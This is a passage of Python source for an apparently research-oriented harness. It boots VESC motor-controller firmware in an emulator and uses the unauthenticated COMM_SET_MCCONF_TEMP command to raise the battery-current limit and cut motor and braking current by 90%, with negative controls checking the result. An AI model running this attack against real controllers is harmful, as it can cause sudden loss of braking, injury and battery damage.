# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""The vesc-bldc-f405 attack, driven against the firmware's OWN COMM engine.

**The vulnerability.** VESC's binary COMM protocol has no authentication, no
session and no sequence number. Every command is accepted from anyone who can
put bytes on the controller's UART header (or its CAN bus, or its USB port).
``COMM_SET_MCCONF`` is one of those commands, and it rewrites the *motor
configuration* -- including ``l_current_max``, the motor-current limit that is
the ESC's and the motor's primary protection against overcurrent. The firmware's
only check is a four-byte ``MCCONF_SIGNATURE`` constant compiled into the image
(``confgenerator.h:11``), which is a **version tag, not a credential**: it is the
same for every VESC of that firmware version, and the device hands it out itself
in every ``COMM_GET_MCCONF`` reply.

**The attack.** Read the live configuration with ``COMM_GET_MCCONF``, change two
of the motor's protection limits in the firmware's own values, write them back
with ``COMM_SET_MCCONF_TEMP``, and read them out again:

* ``l_in_current_max`` 250.0 A -> **300.0 A** -- the battery-current ceiling, i.e.
  how hard the controller is allowed to pull on the pack. Raising it is how you
  push a battery past its safe discharge rate.
* ``l_current_max_scale`` 1.00 -> **0.10** -- the motor-current scaling, i.e. a
  90 % cut in available torque and regenerative braking. On a moving vehicle
  that is a sudden, remote loss of drive and brake.

``COMM_SET_MCCONF_TEMP`` writes straight into
``mc_interface_get_configuration()``; with its ``store`` flag clear it does not
touch the emulated EEPROM, so the change is live immediately (see
``STATUS.md`` for why the EEPROM-writing ``COMM_SET_MCCONF`` is impractically
slow under emulation). Every field the attacker does not intend to change is
copied out of the device's own reply, so the packet is a real read-modify-write.

**The oracle is the firmware's own reply.** ``landed`` is set only when a
*second, independent* ``COMM_GET_MCCONF`` -- a fresh request, answered by
``commands_send_mcconf()`` out of ``mc_interface_get_configuration()``, framed
and CRC'd by the firmware's own ``packet.c`` -- reports the attacker's value.
Nothing on this side is consulted.

**Negative controls run in the same harness, on the same connection** (playbook
§2.22 -- an attack that only shows "the write worked" proves very little):

  1. *Bad CRC.* **The attack frame itself**, byte for byte, with one byte of the
     CRC flipped. ``try_decode_packet()`` must drop it: no reply, and the
     configuration must be untouched. Same harness, same payload, same code path
     on this side -- the only difference is the checksum, so if this "worked" the
     oracle would be measuring the harness rather than the firmware.
  2. *Values the firmware must refuse.* The same command asking for
     ``l_in_current_max = 5000 A`` and ``l_current_max_scale = 9.0``. The handler
     runs ``utils_truncate_number()`` against this board's own
     ``HW_LIM_CURRENT_IN`` (-300, 300) and against the fixed 0.0-1.0 scale range,
     so the firmware must clamp them to 300.0 and 1.0. A device that merely
     stored what it was handed would report 5000 and 9.0 back.

If either control "succeeds", the oracle is measuring this harness rather than
the firmware, and ``landed`` is forced false with the reason recorded.
"""
from __future__ import annotations

import hashlib
import json
import math
import os
import re
import socket
import struct
import subprocess
import sys
import time
from typing import Callable, Dict, List, Optional

from . import paths, spawn
from . import vesc_comm as vc


_LOG_POS: dict = {}
_LOG_BUF: dict = {}


def _read_log_incremental(path: str) -> str:
    """The spawn log so far, read INCREMENTALLY from a saved offset.

    This replaces ``open(path).read()``, which re-read the WHOLE file on every
    pass of a ~1 Hz readiness poll. That is harmless for this device's own few
    kB of log and catastrophic when anything else is writing to the same path:
    an abandoned emulator holding a multi-GB log open makes each pass cost
    seconds. The client then connects late, a frame the guest transmitted
    before the connect is missed, and the run grades the device BELOW its real
    rung -- an instrument artefact, not a property of the firmware.

    Reading from a saved offset makes the poll cost independent of the file's
    size and of any other writer. If the file shrank (a new run truncated it)
    the offset is reset so the fresh contents are not skipped.
    """
    try:
        size = os.path.getsize(path)
        if size < _LOG_POS.get(path, 0):
            _LOG_POS[path] = 0
            _LOG_BUF[path] = ""
        with open(path, "rb") as fh:
            fh.seek(_LOG_POS.get(path, 0))
            chunk = fh.read()
        if chunk:
            _LOG_POS[path] = _LOG_POS.get(path, 0) + len(chunk)
            _LOG_BUF[path] = _LOG_BUF.get(path, "") + chunk.decode("utf-8", "replace")
    except OSError:
        pass
    return _LOG_BUF.get(path, "")


# What the attacker installs. Both are chosen so the read-back tests the WRITE
# and not a clamp: hw_100_250.h:256 declares HW_LIM_CURRENT_IN -300.0, 300.0, so
# 300.0 A is the top of this hardware's own range and passes
# `utils_truncate_number()` unchanged; and the handler truncates the current
# scales to 0.0-1.0, so 0.10 passes too. Both are exactly representable in the
# encodings VESC uses (binary32, and int16/10000).
ATTACK_IN_CURRENT_MAX = 300.0
ATTACK_CURRENT_MAX_SCALE = 0.10

# A terminal command the firmware answers with a string only IT can produce.
# Sending one is also load-bearing, not decoration: `commands_printf()` writes
# through `send_func_blocking`, and NOTHING sets that except the blocking
# command group -- of which COMM_TERMINAL_CMD is a member (commands.c:1687-1715).
# Until a terminal command has been sent, every warning the firmware prints,
# including the one the negative control is looking for, is composed and then
# dropped on the floor with no error. That is a property of the firmware, not of
# this rehost.
TERMINAL_PROBE = b"fault"

BOOT_MARKER = "USART3: enabled by the firmware"
#: Falsification knob for the census seam.  With ``HAL_SEAM_CONTROL=1`` no VESC
#: packet is ever put on the wire, so the firmware's own packet.c never answers
#: and ``vesc_packet_round_trip`` -- and therefore ``landed`` -- must come out
#: false.  A seam boolean that no control can move is not evidence.  It is armed
#: only after the boot oracle has been satisfied, so the control falsifies the
#: evidence seam rather than the boot check in front of it.
SEAM_CONTROL = os.environ.get("HAL_SEAM_CONTROL") == "1"
_SEAM_ARMED = False

BOOT_TIMEOUT = float(os.environ.get("VESC_BOOT_TIMEOUT", "900"))
REPLY_TIMEOUT = float(os.environ.get("VESC_REPLY_TIMEOUT", "180"))
# How long to wait when the firmware's source says NOTHING should come back.
SILENCE_TIMEOUT = float(os.environ.get("VESC_SILENCE_TIMEOUT", "25"))

# ---------------------------------------------------------------------------
# SEAM RE-ESTABLISHMENT.  Read this before believing any "the firmware ignored
# it" reading on this device.
#
# `comm/packet.c` in the pinned tree has **no `rx_timeout` and no
# `packet_timerfunc`** -- the fleet's first guess, and it is wrong at source
# level.  The decoder re-synchronises only by CONSUMING bytes:
#
#   * `try_decode_packet` returns -1 and `rx_read_ptr` advances ONE byte, then
#     the whole scan runs again -- so a rejected N-byte frame costs O(N^2);
#   * while `bytes_left > 1` it swallows bytes without attempting a decode at
#     all, so ONE malformed 16-bit-length header can make it eat the next 255
#     bytes -- every known-good request inside that window looks ignored;
#   * the ONLY unconditional reset is the overflow one:
#         if (data_len >= PACKET_BUFFER_LEN) { write=read=0; bytes_left=0; }
#
# So the correct re-establishment is to PUSH `PACKET_BUFFER_LEN` bytes at it.
# Measured on this device, after a 255-byte-payload frame:
#
#     three plain known-good retries, 30 s each   ->  DEAD, 3/3
#     544 bytes of filler, then one retry         ->  ALIVE in 0.03 s
#
# `RESYNC_FLUSH` is that push. It is filler the decoder can never accept: 0x00
# is not a valid start byte, so once `bytes_left` is clear each filler byte
# costs one O(1) rejection, and while `bytes_left` is large the filler is what
# drives `data_len` to the overflow reset.
PACKET_BUFFER_LEN = 520          # packet.h: PACKET_MAX_PL_LEN (512) + 8
RESYNC_FLUSH = PACKET_BUFFER_LEN + 24
RESYNC_QUICK_TIMEOUT = float(os.environ.get("VESC_RESYNC_QUICK_S", "20"))
RESYNC_FLUSH_TIMEOUT = float(os.environ.get("VESC_RESYNC_FLUSH_S", "120"))
RESYNC_ROUNDS = int(os.environ.get("VESC_RESYNC_ROUNDS", "3"))

#: Falsification knob for the two new rungs.  `""` is the real run.
#:   m6-freeze        grade every M6 round against round 0's state
#:   m7-valid-only    replace every malformed probe with its own valid twin
#:   m7-mispredict    rotate each class's expectation onto the next DISTINCT answer
FALSIFY = os.environ.get("VESC_FALSIFY", "").strip().lower()
FALSIFY_MODES = ("", "m6-freeze", "m7-valid-only", "m7-mispredict")
#: When set, both the default arm and a `--falsify` arm mint IDENTICAL values,
#: so the FIRMWARE's replies can be compared byte for byte across the two.
MINT_SEED = os.environ.get("VESC_MINT_SEED")

#: The board's own limits, from `hw_100_250.h:256` (HW_LIM_CURRENT_IN) and
#: `commands.c`'s fixed 0.0-1.0 range for the current scales. Both were
#: RE-MEASURED live before being written here, not taken from the header.
HW_LIM_CURRENT_IN = 300.0
SCALE_LIMITS = (0.0, 1.0)


# ---------------------------------------------------------------------------
# THE TWO STARTUP GATES.  Read this before trusting any milestone below.
#
# `run_attack` used to pre-initialise its result with `"milestone": "M1"` and
# then do `if not sc.boot(stage): return result`.  Every failure inside
# `boot()` -- "HALucinator exited during boot (rc=..., see <path>)", "the
# firmware never enabled USART3", "could not connect to the bridge" -- therefore
# reported **M1**, so a HOST-side startup failure (wrong interpreter, missing
# halucinator, an import error, an arch the core does not have) was recorded
# indistinguishably from a firmware that genuinely walls at M1.  On THIS device
# that mattered: two core-validation agents ran it concurrently on 2026-09-01,
# and a harness that cannot tell a dead install from a dead device can hand a
# core gate a false "safe to ship".
#
# The pre-init is now "M0" and those paths report `"milestone": "ERROR"` with
# the child's own exception IN THE RESULT, instead of a path to a file nobody
# reads.
#
# GATE 1 -- the core's own positive CPU-start marker.
# `halucinator.main` logs "Letting Unicorn Run" immediately before it enters the
# dispatch loop.  Absent => the CPU never started => nothing above M0 is
# measurable.
#
#   *** THE MARKER IS NOT FREE. ***  `python -m halucinator.main` runs main.py
#   as `__main__`, so the marker goes to the logger "__main__" -- not to the
#   "halucinator.main" this device's `configs/logging.cfg` named.  On the cores
#   whose CWD branch loads that file with `disable_existing_loggers=True`,
#   "__main__" is disabled outright, and raising root's level does NOT help
#   because a disabled logger emits nothing at any level.  Measured on this
#   device on 2026-09-02, BEFORE the fix: a boot that reached the firmware's own
#   USART3 driver contained ZERO occurrences of the marker.  `logging.cfg` now
#   carries a `[logger_mainmod]` stanza (propagate=0 + its own handler, so it
#   works on both branches) and the marker prints.
#
#   `logging_cfg_present()` therefore tests PRINTABILITY -- the file exists AND
#   names `__main__` -- not mere existence.  When it is False, Gate 1 reports
#   `None`, never False: an absent marker must never be read as a startup
#   failure when the real cause is that it could not have been printed.  That
#   distinction is what stops this gate from false-demoting a healthy run.
#
# GATE 2 -- a measured-work floor (credit: a peer session's autofuzz
# `g_blocks_per_exec` gate, which caught a generated harness writing
# `passed:true` with `blocks_per_exec: 0`).  Gate 1 proves the core reached the
# point of starting the CPU; Gate 2 proves the CPU then did real work.  A fault
# immediately after the print passes Gate 1 and fails Gate 2.
#
#   THE METRIC IS THE EMULATOR CHILD'S OWN **CPU TIME**, not a firmware counter.
#   A firmware-derived counter would convert a genuine early firmware wall into
#   a fabricated "install broken" verdict, which is exactly the classifier
#   failure a work floor must not commit.  CPU seconds are model- and
#   firmware-independent and -- unlike wall clock -- do not tighten when the box
#   is loaded, which on this machine varies by more than 1.7x between runs of
#   the same device.
#
# THE FLOOR IS DERIVED FROM THIS DEVICE'S OWN HEALTHY BOOT, never a fleet
# constant.  See WORK_HEALTHY_CPU_S for the measurement.
RUN_MARKER = "Letting Unicorn Run"
#: CPU seconds the emulator child had burned AT THE GATE -- the moment the
#: firmware's own USART3 driver enabled the port (BOOT_MARKER) -- on this
#: device's own healthy boot.  Measured twice on 2026-09-02:
#:
#:     run A: 25.77 CPU s, 26.1 s wall, box load 22.7
#:     run B: 25.34 CPU s, 26.1 s wall, box load 17.9
#:
#: 1.7 % apart across a 27 % swing in box load, which is the whole reason the
#: metric is CPU time and not wall clock: it measures work, so it does not
#: tighten when the machine is busy.
WORK_HEALTHY_CPU_S = float(os.environ.get("VESC_HEALTHY_CPU_S", "25.3"))
#: Gate 2's floor: 2.0 CPU seconds, about 1/13 of the measured healthy reading.
#: Deliberately far below it.  A floor tuned close to the healthy figure files a
#: slow-but-live boot as a dead device -- this fleet has already misfiled walls
#: that way (bgan-inmarsat at a 420 s bound; zigbee-znp needed 25 s -> 55 s) --
#: and a floor is a classifier, so the only safe direction to be wrong in is
#: down.  The failure it must catch reads **0.00**: a child that dies before it
#: can import halucinator has burned no CPU at all.  A live guest, however
#: slowly it is progressing, burns CPU continuously and clears 2.0 s within
#: seconds of starting.
WORK_FLOOR_CPU_S = float(os.environ.get("VESC_WORK_FLOOR_CPU_S", "2.0"))
#: Evidence that the GUEST ran and then faulted.  These strings can only be
#: produced by the core's own guest-fault path, which requires the core to be
#: executing guest instructions -- so their presence is proof the install works
#: and the failure belongs to the firmware.  Gate 2 must NOT fire when they are
#: present: a firmware that faults after 1.5 CPU seconds would otherwise be
#: filed as a broken install, which is precisely the classifier failure a work
#: floor must not commit.  A bare Python ``Traceback`` is deliberately NOT in
#: this list -- that is an install symptom, not a guest fault.
_GUEST_FAULT_MARKERS = ("UC_ERR", "FETCH-DERAIL", "unicorn.unicorn.UcError",
                        "UcError")


def _child_cpu_seconds(proc) -> float:
    """CPU seconds burned by the emulator child and its own children.

    Sampled while the child is still alive; returns 0.0 once it is gone or if
    it was never started, which is exactly the reading a failed startup gives.

    Raises RuntimeError if psutil is missing -- see below.
    """
    if proc is None:
        return 0.0
    # An ABSENT psutil is not a measurement of zero. Swallowing the ImportError
    # here returned 0.0, which is byte-identical to "the emulator did no work"
    # -- so running in a venv without psutil failed gate 2 on a HEALTHY boot and
    # blamed the device. Distinguish the two: a gate that cannot measure must
    # say so, not report the failing value.
    try:
        import psutil
    except ImportError as exc:                             # noqa: BLE001
        raise RuntimeError(
            "gate 2 cannot measure child CPU time: psutil is not installed in "
            f"this interpreter ({sys.executable}). This is a HARNESS fault, not "
            "a device result -- rerun in a venv that has psutil rather than "
            "reading the 0.0 this used to return."
        ) from exc
    try:
        p = psutil.Process(proc.pid)
        t = p.cpu_times()
        total = float(t.user) + float(t.system)
        for c in p.children(recursive=True):
            try:
                ct = c.cpu_times()
                total += float(ct.user) + float(ct.system)
            except Exception:                              # noqa: BLE001
                pass
        return total
    except Exception:                                      # noqa: BLE001
        return 0.0


def _last_exception(text: str) -> str:
    """``ExceptionClass: message`` of the last traceback in the child's log.

    The fleet-wide shape is `note="HALucinator exited during boot (see %s)"`:
    the reason lives in a file and the operator is handed a path.  The reason
    belongs in the RESULT, so it cannot be mistaken for a device fact.
    """
    blocks = re.split(r"(?=Traceback \(most recent call last\))", text)
    for block in reversed(blocks):
        if not block.startswith("Traceback"):
            continue
        lines = [ln for ln in block.splitlines() if ln.strip()]
        for ln in reversed(lines):
            if ln.startswith(" "):
                continue
            if re.match(r"^[A-Za-z_][\w.]*(?:Error|Exception|Exit|Interrupt"
                        r"|Warning|Failure|Fault)?: ?", ln.strip()):
                return ln.strip()
        if lines:
            return lines[-1].strip()
    return ""


class VescScenario:
    """Boots the rehosted VESC and speaks its COMM protocol over the USART3
    bridge. The firmware is the real rehost; nothing here is simulated."""

    def __init__(self, bridge_port: int = spawn.BRIDGE_PORT,
                 python: Optional[str] = None,
                 log_dir: Optional[str] = None) -> None:
        self.bridge_port = bridge_port
        self.python = python or sys.executable
        self.log_dir = log_dir or "/tmp"
        self.host = "127.0.0.1"
        self._procs: List[subprocess.Popen] = []
        self._sock: Optional[socket.socket] = None
        self._rx = bytearray()
        self.log = os.path.join(self.log_dir, ("vesc_bldc_f405_attack.%d.log" % os.getpid()))
        #: Set by :meth:`boot` on every failure path. Carries the gate readings
        #: and the CHILD'S OWN exception, so the caller can put the reason in
        #: the RESULT instead of handing the operator a path to a file.
        self.startup_failure: Optional[Dict] = None

    # ---- the startup gates -------------------------------------------------
    def _emu(self):
        return self._procs[0] if self._procs else None

    def cpu_seconds(self) -> float:
        """Gate 2's metric: CPU seconds burned by the emulator child."""
        return _child_cpu_seconds(self._emu())

    def returncode(self):
        """The child's rc if it died on its own, else ``None``."""
        p = self._emu()
        return None if p is None else p.poll()

    def log_text(self) -> str:
        try:
            return open(self.log, errors="replace").read()
        except OSError:
            return ""

    @staticmethod
    def logging_cfg_present() -> bool:
        """Whether Gate 1's marker CAN be printed at all.

        Existence is NOT the test.  `setLogConfig()` reads `logging.cfg` from
        the CHILD'S CWD (the packaged configs dir), and the marker is written to
        the logger `__main__`; a `logging.cfg` that does not NAME `__main__`
        leaves it inheriting root's ERROR -- or disabled outright on the cores
        whose CWD branch passes `disable_existing_loggers=True`.  This device
        shipped exactly such a file, and a boot that reached the firmware's own
        USART3 driver printed the marker zero times.  So: present AND naming
        `__main__`.
        """
        try:
            cfg = paths.configs_dir() / "logging.cfg"
            return cfg.is_file() and "__main__" in cfg.read_text(errors="replace")
        except Exception:                                  # noqa: BLE001
            return False

    def startup_error(self, cpu_s: Optional[float] = None) -> Optional[Dict]:
        """``None`` if BOTH gates pass, else the diagnosis for the RESULT."""
        text = self.log_text()
        rc = self.returncode()
        cpu = self.cpu_seconds() if cpu_s is None else cpu_s
        tail = [ln for ln in text.splitlines() if ln.strip()]
        gate1 = (RUN_MARKER in text) if self.logging_cfg_present() else None
        common = {
            "gate1_cpu_started": gate1,
            "gate2_child_cpu_s": round(cpu, 2),
            "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
            "child_returncode": rc,
            "child_output_tail": tail[-20:],
            "logging_cfg_present": self.logging_cfg_present(),
            "error_detail": _last_exception(text) or (
                tail[-1] if tail else "(child produced no output at all)"),
        }
        if gate1 is False:
            return dict(common, error=(
                "GATE 1: the emulator never started -- the core's '%s' marker "
                "is absent, so no guest instruction ran (child rc=%s)"
                % (RUN_MARKER, rc)))
        guest_faulted = any(m in text for m in _GUEST_FAULT_MARKERS)
        if cpu < WORK_FLOOR_CPU_S and not guest_faulted:
            return dict(common, error=(
                "GATE 2: the emulator child did no measured work -- %.2f CPU "
                "seconds < this device's floor of %.2f (a healthy boot has "
                "burned %.1f by the time USART3 comes up)"
                % (cpu, WORK_FLOOR_CPU_S, WORK_HEALTHY_CPU_S)))
        return None

    def startup_failure_or_device(self, why: str) -> Dict:
        """Attribute a boot failure to the INSTALL or to the DEVICE.

        ``gated_out`` is True when a gate failed (nothing is measurable, so the
        milestone is ERROR) and False when the gates passed -- which means the
        CPU really did run, and ``why`` is a fact about this firmware rather
        than about the environment.
        """
        bad = self.startup_error()
        if bad:
            bad["error"] = "%s -- %s" % (bad["error"], why)
            bad["gated_out"] = True
            return bad
        text = self.log_text()
        tail = [ln for ln in text.splitlines() if ln.strip()]
        cpu = self.cpu_seconds()
        return {
            "error": "%s -- and the gates PASSED (marker=%s, %.2f CPU seconds "
                     "burned by the child), so this is the device, not the "
                     "install" % (why, (RUN_MARKER in text)
                                  if self.logging_cfg_present() else "n/a", cpu),
            "error_detail": _last_exception(text) or (tail[-1] if tail else ""),
            "gate1_cpu_started": (RUN_MARKER in text)
            if self.logging_cfg_present() else None,
            "gate2_child_cpu_s": round(cpu, 2),
            "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
            "logging_cfg_present": self.logging_cfg_present(),
            "child_returncode": self.returncode(),
            "child_output_tail": tail[-20:],
            "guest_faulted": any(m in text for m in _GUEST_FAULT_MARKERS),
            "gated_out": False,
        }

    # ---- process management ------------------------------------------------
    def _spawn(self, argv, cwd, env, logpath) -> subprocess.Popen:
        p = subprocess.Popen(argv, cwd=cwd, env=env, stdout=open(logpath, "w"),
                             stderr=subprocess.STDOUT, preexec_fn=os.setsid)
        self._procs.append(p)
        return p

    def _log_has(self, needle: str) -> bool:
        try:
            return needle in _read_log_incremental(self.log)
        except OSError:
            return False

    def shutdown(self) -> None:
        # Kill ONLY the PIDs we started. Never a global pattern kill: several
        # emulators run on this machine at once (playbook §2.10).
        if self._sock is not None:
            try:
                self._sock.close()
            except OSError:
                pass
            self._sock = None
        for p in self._procs:
            try:
                os.killpg(p.pid, 15)
            except Exception:  # noqa: BLE001
                pass
            try:
                p.wait(10)
            except Exception:  # noqa: BLE001
                try:
                    p.kill()
                except Exception:  # noqa: BLE001
                    pass
        self._procs = []

    def boot(self, on_stage: Callable) -> bool:
        self.startup_failure = None
        if not paths.firmware_present():
            self.startup_failure = {
                "error": "firmware not found at %s -- build it (FIRMWARE.md) "
                         "and run tools/extract_firmware.py"
                         % paths.firmware_bin(),
                "error_detail": "no emulator was started; no milestone measured",
                "gate1_cpu_started": None, "gate2_child_cpu_s": 0.0,
                "gate2_floor_cpu_s": WORK_FLOOR_CPU_S,
                "logging_cfg_present": self.logging_cfg_present(),
                "child_returncode": None, "child_output_tail": [],
                "gated_out": True,
            }
            on_stage("error", note=self.startup_failure["error"])
            return False
        argv = spawn.spawn_argv(python=self.python, emulator="unicorn")
        env = spawn.spawn_env(uart_port=self.bridge_port)
        on_stage("boot", note="booting the VESC firmware under HALucinator "
                              "(ChibiOS on an STM32F405; reaching the COMM "
                              "stack takes a couple of minutes of wall clock)")
        p = self._spawn(argv, spawn.spawn_cwd(), env, self.log)

        # Readiness is the FIRMWARE's own driver reaching the port: the USART3
        # model logs the moment app_uartcomm_start() writes CR1.UE. Poll the log
        # rather than sleeping (macOS has no timeout(1); playbook §1).
        deadline = time.time() + BOOT_TIMEOUT
        while time.time() < deadline:
            if p.poll() is not None:
                # NOT `note="... (see %s)" % self.log`.  A reason that lives in
                # a file is a reason nobody reads, and it is then indexed as a
                # device fact.  The child's own exception goes in the RESULT.
                self.startup_failure = self.startup_failure_or_device(
                    "the emulator process exited during boot (rc=%s)" % p.poll())
                on_stage("error", note=self.startup_failure["error"])
                return False
            if self._log_has(BOOT_MARKER):
                break
            time.sleep(2)
        else:
            self.startup_failure = self.startup_failure_or_device(
                "the firmware never enabled USART3 within %.0f s" % BOOT_TIMEOUT)
            on_stage("error", note=self.startup_failure["error"])
            return False

        try:
            self._sock = socket.create_connection(
                (self.host, self.bridge_port), timeout=10)
            self._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError as exc:
            self.startup_failure = self.startup_failure_or_device(
                "could not connect to the USART3 bridge on tcp/%d: %s"
                % (self.bridge_port, exc))
            on_stage("error", note=self.startup_failure["error"])
            return False
        on_stage("ready", note="USART3 is up; connected to the COMM seam on "
                               "tcp/%d" % self.bridge_port)
        return True

    # ---- protocol ----------------------------------------------------------
    def _send(self, raw: bytes) -> None:
        assert self._sock is not None
        if SEAM_CONTROL and _SEAM_ARMED:
            return
        self._sock.sendall(raw)

    def _read_frame(self, timeout: float = REPLY_TIMEOUT,
                    want: Optional[int] = None) -> Optional[bytes]:
        """Read until a complete, CRC-valid frame arrives (optionally with a
        given packet id). Returns the payload, or None on timeout.

        Frames are consumed from a persistent buffer, so an unsolicited
        ``COMM_PRINT`` cannot desynchronise the next read.
        """
        assert self._sock is not None
        deadline = time.time() + timeout
        while True:
            while True:
                payload, used = vc.unframe(bytes(self._rx))
                if payload is None:
                    break
                del self._rx[:used]
                if want is None or (payload and payload[0] == want):
                    return payload
            remaining = deadline - time.time()
            if remaining <= 0:
                return None
            self._sock.settimeout(min(remaining, 10.0))
            try:
                chunk = self._sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                return None
            if not chunk:
                return None
            self._rx += chunk

    def request(self, payload: bytes, want: Optional[int] = None,
                timeout: float = REPLY_TIMEOUT) -> Optional[bytes]:
        self._send(vc.frame(payload))
        return self._read_frame(timeout=timeout, want=want)

    def fw_version(self) -> Optional[bytes]:
        return self.request(bytes([vc.COMM_FW_VERSION]),
                            want=vc.COMM_FW_VERSION)

    def get_mcconf(self) -> Optional[bytes]:
        """The firmware's own serialized mc_configuration (without the id byte)."""
        payload = self.request(bytes([vc.COMM_GET_MCCONF]),
                               want=vc.COMM_GET_MCCONF)
        return None if payload is None else payload[1:]

    # ---- read / attack seams ----------------------------------------------
    def read_state(self) -> Dict[str, object]:
        """The firmware's real state, read through its real protocol engine."""
        state: Dict[str, object] = {}
        fw = self.fw_version()
        if fw is not None:
            state["fw_version_frame"] = vc.frame(fw).hex()
            try:
                state.update(vc.parse_fw_version(fw))
            except ValueError:
                pass
        conf = self.get_mcconf()
        if conf is not None:
            state.update(self._decode(conf))
        return state

    @staticmethod
    def _decode(conf: bytes) -> Dict[str, object]:
        """The limits this attack targets, out of the firmware's own bytes."""
        return {
            "mcconf_len": len(conf),
            "mcconf_signature": "0x%08x" % int.from_bytes(conf[:4], "big"),
            "l_current_max": round(
                vc.parse_float32_auto(conf, vc.MCCONF_OFF_L_CURRENT_MAX), 3),
            "l_in_current_max": round(
                vc.parse_float32_auto(conf, vc.MCCONF_OFF_L_IN_CURRENT_MAX), 3),
            "l_current_max_scale": round(
                vc.parse_float16(conf, vc.MCCONF_OFF_L_CURRENT_MAX_SCALE), 4),
        }

    def terminal(self, cmd: bytes,
                 timeout: float = REPLY_TIMEOUT) -> Optional[str]:
        """Run a command on the firmware's own debug terminal, unauthenticated.

        Also registers this connection as ``send_func_blocking``, which is what
        makes ``commands_printf()`` reach the wire at all.
        """
        payload = self.request(bytes([vc.COMM_TERMINAL_CMD]) + cmd,
                               want=vc.COMM_PRINT, timeout=timeout)
        if payload is None:
            return None
        return bytes(payload[1:]).split(b"\x00")[0].decode("latin-1", "replace")

    # ---- the reader repairs (see RESYNC_FLUSH above) -----------------------
    def drain(self, seconds: float = 1.0) -> int:
        """Discard whatever is already queued BEFORE sending a request.

        Without this, a reply that arrived late is handed to the NEXT exchange
        and the answer you read is the previous question's -- w99.2's
        manufactured corpse, from the other side. It bit this lane's own first
        probe of the sibling device, so it is a method here and not a comment.
        """
        end = time.time() + seconds
        n = 0
        while time.time() < end:
            if self._read_frame(timeout=max(0.05, end - time.time())) is None:
                break
            n += 1
        return n

    def resync(self) -> Dict[str, object]:
        """Bounded seam RE-ESTABLISHMENT. Returns what it had to do.

        Cheap first (one known-good frame), then the flush the decoder's own
        overflow reset requires. Every malformed class in the M7 phase is
        followed by one of these and the phase FAILS if any of them comes back
        ``alive=False`` -- so a class graded after a dead seam cannot exist
        (playbook w78.5).
        """
        t0 = time.time()
        flushes = 0
        for k in range(RESYNC_ROUNDS):
            r = self.request(bytes([vc.COMM_FW_VERSION]),
                             want=vc.COMM_FW_VERSION,
                             timeout=(RESYNC_QUICK_TIMEOUT if k == 0
                                      else RESYNC_FLUSH_TIMEOUT))
            if r is not None:
                self.drain(0.5)
                return {"alive": True, "flushes": flushes,
                        "seconds": round(time.time() - t0, 2)}
            self._send(b"\x00" * RESYNC_FLUSH)
            flushes += 1
        return {"alive": False, "flushes": flushes,
                "seconds": round(time.time() - t0, 2)}

    def terminal_lines(self, cmd: bytes, first: float = REPLY_TIMEOUT,
                       quiet: float = 6.0) -> List[str]:
        """EVERY ``COMM_PRINT`` the firmware emits for one terminal command.

        :meth:`terminal` takes only the first, which is why nobody on this
        device had seen its own 115-line ``help`` -- or the second line of its
        refusal, which is the one that carries the host's nonce.
        """
        self.drain(0.5)
        self._send(vc.frame(bytes([vc.COMM_TERMINAL_CMD]) + cmd))
        out: List[str] = []
        tmo = first
        while True:
            p = self._read_frame(timeout=tmo)
            if p is None:
                break
            if p and p[0] == vc.COMM_PRINT:
                out.append(bytes(p[1:]).split(b"\x00")[0]
                           .decode("latin-1", "replace"))
            tmo = quiet
        return out

    def accepted_packets(self) -> Optional[int]:
        """The GUEST's own count of packets its decoder accepted, or None.

        `commands_process_packet` is reached exactly once per packet
        `try_decode_packet()` accepted, and this device's `boot_trace` handler
        logs `BOOT-COUNT: ... n=<N>` on every arrival. The number is therefore
        produced by the guest reaching a guest address -- a host cannot compute
        it without reimplementing packet.c, which is precisely what makes it a
        witness rather than bookkeeping.
        """
        hits = re.findall(r"BOOT-COUNT: commands_process_packet[^\n]*n=(\d+)",
                          _read_log_incremental(self.log))
        return int(hits[-1]) if hits else None

    def raw_config_fields(self) -> Optional[Dict[str, str]]:
        """The two graded limits as the firmware's OWN bytes, unrounded.

        `_decode` rounds to three decimals, which is right for a report and
        wrong for a one-ULP bracket: 299.99997 and 300.0 both print `300.0`.
        """
        conf = self.get_mcconf()
        if conf is None:
            return None
        return {
            "l_in_current_max": conf[vc.MCCONF_OFF_L_IN_CURRENT_MAX:
                                     vc.MCCONF_OFF_L_IN_CURRENT_MAX + 4].hex(),
            "l_current_max_scale": conf[vc.MCCONF_OFF_L_CURRENT_MAX_SCALE:
                                        vc.MCCONF_OFF_L_CURRENT_MAX_SCALE
                                        + 2].hex(),
        }

    def attack(self) -> dict:
        """Unauthenticated COMM_SET_MCCONF_TEMP: move the motor's safety limits.

        Runs the negative controls in the SAME harness on the SAME connection,
        then the attack, then a fresh independent read-back. ``landed`` requires
        all of it.
        """
        res: dict = {"landed": False}

        # A terminal session: unauthenticated in its own right, and the reply is
        # a string only the firmware can produce.
        res["terminal_cmd"] = TERMINAL_PROBE.decode()
        res["terminal_reply"] = self.terminal(TERMINAL_PROBE)

        base = self.get_mcconf()
        if base is None:
            res["error"] = "the firmware did not answer COMM_GET_MCCONF"
            return res
        res["before"] = self._decode(base)
        res["requested"] = {"l_in_current_max": ATTACK_IN_CURRENT_MAX,
                            "l_current_max_scale": ATTACK_CURRENT_MAX_SCALE}

        payload = vc.set_mcconf_temp_payload(
            base, store=False, ack=True,
            l_in_current_max=ATTACK_IN_CURRENT_MAX,
            l_current_max_scale=ATTACK_CURRENT_MAX_SCALE)
        good = vc.frame(payload)
        res["attack_frame"] = good.hex()

        # ---- negative control 1: THE SAME FRAME with a corrupted CRC --------
        # Byte for byte the attack, one byte different, and that byte is only
        # the checksum. try_decode_packet() must drop it: no reply, and no
        # change. If this "worked", the oracle would be measuring this harness
        # rather than the firmware (playbook §2.22).
        bad_crc = bytearray(good)
        bad_crc[-3] ^= 0xFF
        self._send(bytes(bad_crc))
        res["neg_bad_crc_reply"] = self._read_frame(
            timeout=SILENCE_TIMEOUT) is not None
        after_crc = self.get_mcconf()
        res["neg_bad_crc_state"] = None if after_crc is None \
            else self._decode(after_crc)
        res["neg_bad_crc_rejected"] = bool(
            not res["neg_bad_crc_reply"]
            and after_crc is not None
            and self._decode(after_crc) == res["before"])

        # ---- negative control 2: values the firmware MUST refuse ----------
        # The same command, the same code path, but asking for
